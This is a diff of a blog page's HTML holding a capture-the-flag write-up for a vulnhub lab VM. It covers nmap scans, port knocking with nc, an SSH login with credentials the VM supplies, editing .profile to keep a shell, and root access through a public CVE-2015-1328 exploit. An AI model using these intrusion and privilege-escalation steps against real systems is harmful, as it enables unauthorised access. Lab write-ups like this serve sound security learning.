@@ -93,7 +93,8 @@
     </header>
 
     <div class="entry-content">
-            <p><img alt="beavis and butthead" class="align-left" src="/media/2015.06/beavis_butthead.jpg" width="262"/></p>
+            <p><img class="align-left"
+src="/media/2015.06/beavis_butthead.jpg" alt="beavis and butthead" width="262"></p>
 <p>I continued to play with the vulnhub virtual machine an started the
 <a href="https://www.vulnhub.com/entry/tophatsec-fartknocker,115/">TopHatSec - Fart Knocker</a>.
 This VM is an Ubuntu 14.04 32 bits.</p>
@@ -104,9 +105,10 @@ P.S. I got the word "Fart Knocker" from watching beavis and butthead back in the
 day. Otherwise you kids might not understand :)</p>
 </blockquote>
 
-<h1 id="discovery">Discovery</h1>
+
+<h1>Discovery</h1>
 <p>First of all we determine the VM IP address a with a simple <code>nmap -sP</code>.</p>
-<h2 id="nmap">Nmap</h2>
+<h2>Nmap</h2>
 <p>As always we start by <a href="http://nmap.org/">nmaping</a> the server in order to see the open ports:</p>
 <div class="highlight"><pre><span></span>[<span class="nv">maggick</span>@<span class="nv">arch</span> <span class="nv">FartKnocker</span>]$ <span class="nv">nmap</span> <span class="o">-</span><span class="nv">A</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">6</span>
 # <span class="nv">Nmap</span> <span class="mi">6</span>.<span class="mi">47</span> <span class="nv">scan</span> <span class="nv">initiated</span> <span class="nv">Thu</span> <span class="nv">Apr</span> <span class="mi">23</span> <span class="mi">16</span>:<span class="mi">21</span>:<span class="mi">05</span> <span class="mi">2015</span> <span class="nv">as</span>: <span class="nv">nmap</span> <span class="o">-</span><span class="nv">oA</span> <span class="nv">nmap</span> <span class="o">-</span><span class="nv">A</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">6</span>
@@ -115,18 +117,20 @@ day. Otherwise you kids might not understand :)</p>
 <span class="nv">Not</span> <span class="nv">shown</span>: <span class="mi">999</span> <span class="nv">closed</span> <span class="nv">ports</span>
 <span class="nv">PORT</span>   <span class="nv">STATE</span> <span class="nv">SERVICE</span> <span class="nv">VERSION</span>
 <span class="mi">80</span><span class="o">/</span><span class="nv">tcp</span> <span class="nv">open</span>  <span class="nv">http</span>    <span class="nv">Apache</span> <span class="nv">httpd</span> <span class="mi">2</span>.<span class="mi">4</span>.<span class="mi">7</span> <span class="ss">((</span><span class="nv">Ubuntu</span><span class="ss">))</span>
-<span class="o">|</span><span class="nv">_http</span><span class="o">-</span><span class="nv">title</span>: <span class="nv">Site</span> <span class="nv">doesn</span><span class="s1">'</span><span class="s">t have a title (text/html).</span>
+<span class="o">|</span><span class="nv">_http</span><span class="o">-</span><span class="nv">title</span>: <span class="nv">Site</span> <span class="nv">doesn</span><span class="s1">&#39;</span><span class="s">t have a title (text/html).</span>
 
 <span class="nv">Service</span> <span class="nv">detection</span> <span class="nv">performed</span>. <span class="nv">Please</span> <span class="nv">report</span> <span class="nv">any</span> <span class="nv">incorrect</span> <span class="nv">results</span> <span class="nv">at</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">nmap</span>.<span class="nv">org</span><span class="o">/</span><span class="nv">submit</span><span class="o">/</span> .
 # <span class="nv">Nmap</span> <span class="nv">done</span> <span class="nv">at</span> <span class="nv">Thu</span> <span class="nv">Apr</span> <span class="mi">23</span> <span class="mi">16</span>:<span class="mi">21</span>:<span class="mi">12</span> <span class="mi">2015</span> <span class="o">--</span> <span class="mi">1</span> <span class="nv">IP</span> <span class="nv">address</span> <span class="ss">(</span><span class="mi">1</span> <span class="nv">host</span> <span class="nv">up</span><span class="ss">)</span> <span class="nv">scanned</span> <span class="nv">in</span> <span class="mi">6</span>.<span class="mi">98</span> <span class="nv">seconds</span>
 </pre></div>
+
+
 <p>Only the port 80 is open with an HTTP server.</p>
 <p>As always I had launch a <a href="https://cirt.net/nikto2">nikto</a> against the server
 but no interesting result.</p>
-<h1 id="exploitation_1">Exploitation</h1>
+<h1>Exploitation</h1>
 <p>We go to the web page and only found a pcap file which is a capture of some
 network traffic.</p>
-<h2 id="pcap1">pcap1</h2>
+<h2>pcap1</h2>
 <p>We analyse the <code>pcap1.pcap</code> file. The packets and the VM name leads us to ports
 knocking. As I do not know anything about it I have done some research on internet to
 understand the principle (which is quite simple: send packets to a ports sequence
@@ -146,6 +150,8 @@ the sequence ports extract from the pcap file (it is quite simple to read with
 [<span class="o">*</span>] <span class="nv">Knocking</span> <span class="nv">on</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">6</span>:<span class="mi">8888</span>
 [<span class="o">*</span>] <span class="nv">Scanning</span> <span class="k">for</span> <span class="nv">open</span> <span class="nv">ports</span> <span class="nv">using</span> <span class="nv">nmap</span>
 </pre></div>
+
+
 <p>A <a href="http://nmap.org/">nmap</a> scan is launched after the knocking sequence to see
 what port will open:</p>
 <div class="highlight"><pre><span></span><span class="nv">Starting</span> <span class="nv">Nmap</span> <span class="mi">6</span>.<span class="mi">47</span> <span class="ss">(</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">nmap</span>.<span class="nv">org</span> <span class="ss">)</span> <span class="nv">at</span> <span class="mi">2015</span><span class="o">-</span><span class="mi">04</span><span class="o">-</span><span class="mi">27</span> <span class="mi">16</span>:<span class="mi">35</span> <span class="nv">CEST</span>
@@ -159,18 +165,20 @@ what port will open:</p>
 <span class="nv">Service</span> <span class="nv">detection</span> <span class="nv">performed</span>. <span class="nv">Please</span> <span class="nv">report</span> <span class="nv">any</span> <span class="nv">incorrect</span> <span class="nv">results</span> <span class="nv">at</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">nmap</span>.<span class="nv">org</span><span class="o">/</span><span class="nv">submit</span><span class="o">/</span> .
 <span class="nv">Nmap</span> <span class="nv">done</span>: <span class="mi">1</span> <span class="nv">IP</span> <span class="nv">address</span> <span class="ss">(</span><span class="mi">1</span> <span class="nv">host</span> <span class="nv">up</span><span class="ss">)</span> <span class="nv">scanned</span> <span class="nv">in</span> <span class="mi">6</span>.<span class="mi">43</span> <span class="nv">seconds</span>
 </pre></div>
+
+
 <p>This port run an other HTTP service which give us a second url <code>/burgerworld</code>
 and a second pcap file.</p>
-<h2 id="pcap2">pcap2</h2>
+<h2>pcap2</h2>
 <p>After trying a bit to replay and understand the file I used the follow  TCP
 stream function from <a href="https://www.wireshark.org">wireshark</a>, and the following
 appears:</p>
-<p><img alt="eins drei drei sieben" src="/media/2015.06/beavis.jpg"/></p>
+<p><img alt="eins drei drei sieben" src="/media/2015.06/beavis.jpg"></p>
 <p><strong>eins drei drei sieben</strong> means one, three, three, seven (7 years of German at least
 useful, well it was of some use during the NDH qualifications too).</p>
 <p>Once again we knock on port 1, 3, 3 and 7, the port 1337 open and show us an
 other URL: <code>/iamcornholio/</code>. We got some code looking like base64.</p>
-<h2 id="base64">base64</h2>
+<h2>base64</h2>
 <p>The code is:  T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK which is (after
 base64 decode) "Open up SSH: 8888 9999 7777 6666". Once more, port knocking on
 port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:</p>
@@ -179,6 +187,8 @@ port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:</p>
 <span class="n">nc</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">6</span> <span class="mi">7777</span>
 <span class="n">nc</span> <span class="mi">10</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">6</span> <span class="mi">6666</span>
 </pre></div>
+
+
 <p>Once more we launch nmap to see if a port was opened:</p>
 <div class="highlight"><pre><span></span>[<span class="nv">maggick</span>@<span class="nv">arch</span> <span class="nv">FartKnocker</span>]$ <span class="nv">nmap</span>  <span class="o">-</span><span class="nv">A</span> <span class="mi">10</span>.<span class="mi">0</span>.<span class="mi">2</span>.<span class="mi">6</span>
 
@@ -193,25 +203,29 @@ port 8888, 9999, 7777 and 6666. This time I simply use netcat to knock:</p>
 <span class="o">|</span>   <span class="mi">2048</span> <span class="mi">02</span>:<span class="mi">31</span>:<span class="mi">1</span><span class="nv">c</span>:<span class="mi">77</span>:<span class="nv">aa</span>:<span class="nv">c1</span>:<span class="nv">f6</span>:<span class="mi">2</span><span class="nv">b</span>:<span class="nv">d3</span>:<span class="mi">09</span>:<span class="nv">f6</span>:<span class="nv">e0</span>:<span class="mi">63</span>:<span class="nv">fe</span>:<span class="nv">a9</span>:<span class="mi">37</span> <span class="ss">(</span><span class="nv">RSA</span><span class="ss">)</span>
 <span class="o">|</span><span class="nv">_</span>  <span class="mi">256</span> <span class="nv">fe</span>:<span class="mi">16</span>:<span class="mi">33</span>:<span class="nv">a4</span>:<span class="mi">4</span><span class="nv">d</span>:<span class="mi">7</span><span class="nv">f</span>:<span class="mi">3</span><span class="nv">d</span>:<span class="nv">db</span>:<span class="nv">b6</span>:<span class="mi">11</span>:<span class="nv">d4</span>:<span class="nv">b8</span>:<span class="nv">c1</span>:<span class="mi">32</span>:<span class="nv">b6</span>:<span class="mi">79</span> <span class="ss">(</span><span class="nv">ECDSA</span><span class="ss">)</span>
 <span class="mi">80</span><span class="o">/</span><span class="nv">tcp</span> <span class="nv">open</span>  <span class="nv">http</span>    <span class="nv">Apache</span> <span class="nv">httpd</span> <span class="mi">2</span>.<span class="mi">4</span>.<span class="mi">7</span> <span class="ss">((</span><span class="nv">Ubuntu</span><span class="ss">))</span>
-<span class="o">|</span><span class="nv">_http</span><span class="o">-</span><span class="nv">title</span>: <span class="nv">Site</span> <span class="nv">doesn</span><span class="s1">'</span><span class="s">t have a title (text/html).</span>
+<span class="o">|</span><span class="nv">_http</span><span class="o">-</span><span class="nv">title</span>: <span class="nv">Site</span> <span class="nv">doesn</span><span class="s1">&#39;</span><span class="s">t have a title (text/html).</span>
 
 <span class="nv">Service</span> <span class="nv">detection</span> <span class="nv">performed</span>. <span class="nv">Please</span> <span class="nv">report</span> <span class="nv">any</span> <span class="nv">incorrect</span> <span class="nv">results</span> <span class="nv">at</span> <span class="nv">http</span>:<span class="o">//</span><span class="nv">nmap</span>.<span class="nv">org</span><span class="o">/</span><span class="nv">submit</span><span class="o">/</span> .
 <span class="nv">Nmap</span> <span class="nv">done</span>: <span class="mi">1</span> <span class="nv">IP</span> <span class="nv">address</span> <span class="ss">(</span><span class="mi">1</span> <span class="nv">host</span> <span class="nv">up</span><span class="ss">)</span> <span class="nv">scanned</span> <span class="nv">in</span> <span class="mi">6</span>.<span class="mi">38</span> <span class="nv">seconds</span>
 </pre></div>
+
+
 <p>Well, the ssh port 22 is now open.</p>
-<h2 id="ssh">SSH</h2>
+<h2>SSH</h2>
 <p>We try to connect to it:</p>
 <div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ ssh 10.0.2.6
-The authenticity of host '10.0.2.6 (10.0.2.6)' can't be established.
+The authenticity of host &#39;10.0.2.6 (10.0.2.6)&#39; can&#39;t be established.
 ECDSA key fingerprint is SHA256:uSdkKIWXcJl0j0P5Y+cAzjD9CJOFQ/NxtG8kz8ptzFE.
 Are you sure you want to continue connecting (yes/no)? yes
-Warning: Permanently added '10.0.2.6' (ECDSA) to the list of known hosts.
+Warning: Permanently added &#39;10.0.2.6&#39; (ECDSA) to the list of known hosts.
 ############################################
 # CONGRATS! YOU HAVE OPENED THE SSH SERVER #
 # USERNAME: butthead                       #
 # PASSWORD: nachosrule                     #
 ############################################
 </pre></div>
+
+
 <p>The password and username are given by the ssh message, we should use them
 directly:</p>
 <div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead
@@ -220,19 +234,23 @@ directly:</p>
 # USERNAME: butthead                       #
 # PASSWORD: nachosrule                     #
 ############################################
-butthead@10.0.2.6's password:
+butthead@10.0.2.6&#39;s password:
 Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)
 
  * Documentation:  https://help.ubuntu.com/
 Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
 You are only logging in for a split second! What do you do!
 </pre></div>
+
+
 <p>We got an ssh connection but we are logout immediately.</p>
 <p><em>I will no more put the CONGRATS message for your own sanity.</em></p>
 <p>We execute a command directly within the ssh command (a classic ssh feature):</p>
 <div class="highlight"><pre><span></span>[maggick@arch FartKnocker]$ ssh 10.0.2.6 -lbutthead ls
 nachos
 </pre></div>
+
+
 <p>The commands is executed, my first reaction was to read <code>/etc/passwd/</code> as the
 flag was there in
 <a href="http://maggick.fr/2015/04/vulnhub-freshly.html">the last TopHatSec challenge</a>
@@ -243,17 +261,21 @@ Great job on getting this far.
 
 Can you login as beavis or root ?
 </pre></div>
+
+
 <p>The next step seems to get a beavis or root shell from the butthead one. This a
 privilege escalation.</p>
-<h2 id="guessing">Guessing</h2>
+<h2>Guessing</h2>
 <p><strong>Disclaimer:</strong> during my long guessing period for privilege escalation I looked at
 the other writeup to see if I missed something but they all used password
 bruteforce. I do not like bruteforce, so I continue looking for something else.</p>
 <p>This part was the hardest of this challenge. It take me three weeks (not at full
 time of course) to get over with it. I will give you some of my guessing steps:</p>
 <p>First of all to get a shell we just need to modify the <code>.profil</code> file:</p>
-<div class="highlight"><pre><span></span><span class="nv">sed</span> <span class="s1">'</span><span class="s">s/exit//</span><span class="s1">'</span> <span class="o">-</span><span class="nv">i</span> .<span class="nv">profile</span>
+<div class="highlight"><pre><span></span><span class="nv">sed</span> <span class="s1">&#39;</span><span class="s">s/exit//</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">i</span> .<span class="nv">profile</span>
 </pre></div>
+
+
 <p>Let see what there is in beavis' home:</p>
 <div class="highlight"><pre><span></span>ls /home/beavis
 html
@@ -261,6 +283,8 @@ nc1.sh
 ncone
 nctwo
 </pre></div>
+
+
 <p>There was a lot of netcat scripts but none of them allow us to make our privilege
 escalation.</p>
 <p>Looking for a solution to get login as beavis, we notice that there was more
@@ -284,6 +308,8 @@ pcap3.pcap
 /var/www/html/spanishfly:
 pcap4.pcap
 </pre></div>
+
+
 <p>Even more troll: there is a folder <code>/var/backups/</code> containing backups from the
 <code>/etc/shadow</code> file (which could be useful to crack the password):</p>
 <div class="highlight"><pre><span></span><span class="n">butthead</span><span class="nv">@Huhuhhhhhuhuhhh</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">la</span><span class="w"> </span><span class="o">/</span><span class="nf">var</span><span class="o">/</span><span class="n">backups</span><span class="o">/</span><span class="w"></span>
@@ -298,12 +324,14 @@ pcap4.pcap
 <span class="o">-</span><span class="n">rw</span><span class="c1">-------  1 root root      1143 Mar  3 00:30 passwd.bak</span>
 <span class="o">-</span><span class="n">rw</span><span class="c1">-------  1 root shadow     939 Mar  3 00:30 shadow.bak</span>
 </pre></div>
+
+
 <p>This backups are copied by the daily crontab. A solution may be to attempt to a
 race condition against it. I have not dig into the subject.</p>
 <p>I also used
 <a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privsec-check</a>
 in order to search for the privilege escalation.</p>
-<h2 id="cve-2015-1328">CVE-2015-1328</h2>
+<h2>CVE-2015-1328</h2>
 <p>I had a bit stop to search for the privilege escalation when I saw that an
 exploit as been published for the
 <a href="http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html">CVE-2015-1328</a>,
@@ -315,11 +343,13 @@ launch it, well it works and give me immediately a root shell.</p>
 <span class="nv">You</span> <span class="nv">have</span> <span class="nv">done</span> <span class="nv">a</span> <span class="nv">great</span> <span class="nv">job</span>, <span class="k">if</span> <span class="nv">you</span> <span class="nv">can</span> <span class="nv">see</span> <span class="nv">this</span>, <span class="nv">please</span> <span class="nv">shoot</span> <span class="nv">me</span> <span class="nv">an</span> <span class="nv">email</span>
 <span class="nv">and</span> <span class="nv">let</span> <span class="nv">me</span> <span class="nv">know</span> <span class="nv">that</span> <span class="nv">you</span> <span class="nv">have</span> <span class="nv">beat</span> <span class="nv">this</span> <span class="nv">box</span><span class="o">!</span>
 
-<span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">"</span><span class="s">LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK</span><span class="s2">"</span>
+<span class="nv">SECRET</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK</span><span class="s2">&quot;</span>
 
 <span class="nv">admin</span>@<span class="nv">top</span><span class="o">-</span><span class="nv">hat</span><span class="o">-</span><span class="nv">sec</span>.<span class="nv">com</span>
 </pre></div>
-<h1 id="conclusion_1">Conclusion</h1>
+
+
+<h1>Conclusion</h1>
 <p>This was a nice challenge as I learned a lot about the port knocking. The
 privilege escalation was quit interesting to search for and the CVE-2015-1328
 exploitation was a lot of fun.</p>
